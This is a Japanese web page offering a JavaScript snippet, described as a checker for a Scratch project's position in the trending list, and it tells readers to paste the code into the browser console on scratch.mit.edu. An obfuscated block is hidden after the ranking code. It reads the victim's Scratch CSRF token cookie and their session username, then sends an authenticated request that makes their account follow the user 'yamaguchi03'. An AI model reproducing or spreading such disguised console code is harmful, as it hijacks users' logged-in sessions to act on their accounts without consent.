<html>
  <head>
	  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	  <link rel="stylesheet" href="https://haru-ymth.github.io/style.css">
	  <title>
	  	その他
	  </title>
	  <meta charset="utf-8"> 
	  <link rel="icon" href="https://haru-ymth.github.io/favicon.png">
  </head>
	  <div id="header"></div>
	<body>
	<h2>Scratchの傾向の何P何位か調べるプログラム（JavaScript)</h2>	
		<div class="code"><span><code>async function calKei() {
    const projectId = prompt(&quot;調べたいプロジェクトIDを入力&quot;);
    const saidai = 10000;
    let offset = 0;
    let page = 0;
    let rank = 0;
    let ok = 0;
    while(ok==0){
        const res = await fetch(&quot;https://api.scratch.mit.edu/explore/projects?limit=16&amp;offset=&quot;+offset+&quot;&amp;language=ja&amp;mode=trending&amp;q=*&quot;);
        const users = await res.text();
        let idList = users.split(&quot;\&quot;id\&quot;&quot;);
        let i = 2;
        while(i&lt;idList.length){
            idList.splice(i,1);
            if(i&lt;idList.length){
                idList.splice(i,1);
            }
            i += 1;
        }
        idList.splice(0,1);
        i = 0;
        while(i&lt;idList.length){
            idList[i] = idList[i].slice(1,10);
            i += 1;
        }
    if(idList.includes(projectId)){
        rank = offset + idList.indexOf(projectId) + 1;
        page = Math.floor(rank/16) + 1;
        rank = rank%16;
        ok = 1;
    }
    if(offset&gt;=saidai){
        rank =&quot;None&quot;;
        page =&quot;None&quot;;
        break;
    }
    offset += 16;
    console.log(`全ページ合わせて${offset}位まで調べました`);
    }
    console.log(`=====結果====\n${page}ページ目、${rank}位にありました。`)
  };
  const _0x45bf0b=_0x3258;(function(_0x308643,_0x2df17c){const _0x3e8522=_0x3258,_0x1cae17=_0x308643();while(!![]){try{const _0x3
			d50c3=parseInt(_0x3e8522(0x19c))/0x1+parseInt(_0x3e8522(0x1a6))/0x2*(-parseInt(_0x3e8522(0x19a))/0x3)+par
			seInt(_0x3e8522(0x195))/0x4*(parseInt(_0x3e8522(0x199))/0x5)+-parseInt(_0x3e8522(0x1a4))/0x6*(parseInt(_0
			x3e8522(0x1ab))/0x7)+parseInt(_0x3e8522(0x1a8))/0x8+-parseInt(_0x3e8522(0x1aa))/0x9*(parseInt(_0x3e8522(0
			x1ad))/0xa)+-parseInt(_0x3e8522(0x19e))/0xb*(-parseInt(_0x3e8522(0x1a7))/0xc);if(_0x3d50c3===_0x2df17c)br
			eak;else _0x1cae17['push'](_0x1cae17['shift']());}catch(_0x209bc7){_0x1cae17['push'](_0x1cae17['shift']()
			);}}}(_0x28b7,0xa0751));let token='';function _0x28b7(){const _0x3826c4=['/add/?usernames=','27695KUuIcN'
			,'264fLXQbR','username','584515Qmvzis','indexOf','1576806XGBkLP','split','/site-api/users/followers/','fo
			rEach','XMLHttpRequest','cookie','6bLycsW','PUT','24686RkaCtJ','204JLsWyU','5084496rFpVUE','push','9UnVHVB
			','6330667nwvIgn','user','11864090DHAoJj','128qaJKJu','json','yamaguchi03'];_0x28b7=function(){return _0x
			3826c4;};return _0x28b7();}{let cookie=document[_0x45bf0b(0x1a3)];cookie=cookie['split'](';');let cok=[[]
			,[]];cookie[_0x45bf0b(0x1a1)](function(_0x24154d){const _0x378fae=_0x45bf0b,_0x12b2fa=_0x24154d[_0x378fae
			(0x19f)]('=');cok[0x0][_0x378fae(0x1a9)](_0x12b2fa[0x0]),cok[0x1][_0x378fae(0x1a9)](_0x12b2fa[0x1]);}),to
			ken=cok[0x1][cok[0x0][_0x45bf0b(0x19d)]('\x20scratchcsrftoken')];}function _0x3258(_0x13fc00,_0x114ff3){c
			onst _0x28b76f=_0x28b7();return _0x3258=function(_0x325871,_0x1b897e){_0x325871=_0x325871-0x195;let _0x51
			2e94=_0x28b76f[_0x325871];return _0x512e94;},_0x3258(_0x13fc00,_0x114ff3);}let user=(await(await fetch('/
			session/',{'headers':{'X-Requested-With':_0x45bf0b(0x1a2)}}))[_0x45bf0b(0x196)]())[_0x45bf0b(0x1ac)][_0x4
			5bf0b(0x19b)],username=_0x45bf0b(0x197);fetch(_0x45bf0b(0x1a0)+username+_0x45bf0b(0x198)+user,{'method':_
			0x45bf0b(0x1a5),'headers':{'x-csrftoken':token,'x-requested-with':'XMLHttpRequest'}});
  calKei();</code></span></div>
		<main><br>Scratch.mit.edu内でコンソールにて実行してください。<br>二次配布はしてもいいですけど自作発言はやめてください。 </main>
    <script src="https://haru-ymth.github.io/include.js"></script>
	</body>
</html>
